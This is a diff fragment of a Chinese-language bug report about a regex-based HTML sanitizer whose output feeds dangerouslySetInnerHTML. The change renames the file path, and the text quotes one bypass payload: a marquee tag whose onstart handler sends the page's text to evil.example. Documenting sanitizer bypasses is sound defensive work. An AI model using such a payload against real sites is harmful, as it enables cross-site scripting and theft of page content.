@@ -2,7 +2,7 @@
 
 ## 现象
 
-`src/info/extract/sanitize.ts` 用正则清洗第三方正文（结果交给 `dangerouslySetInnerHTML`），两个 payload 原样进了 DOM：
+`src/workshop/extract/sanitize.ts` 用正则清洗第三方正文（结果交给 `dangerouslySetInnerHTML`），两个 payload 原样进了 DOM：
 
 ```
 <marquee title="a>" onstart="fetch('https://evil.example/'+document.body.innerText)">x</marquee>
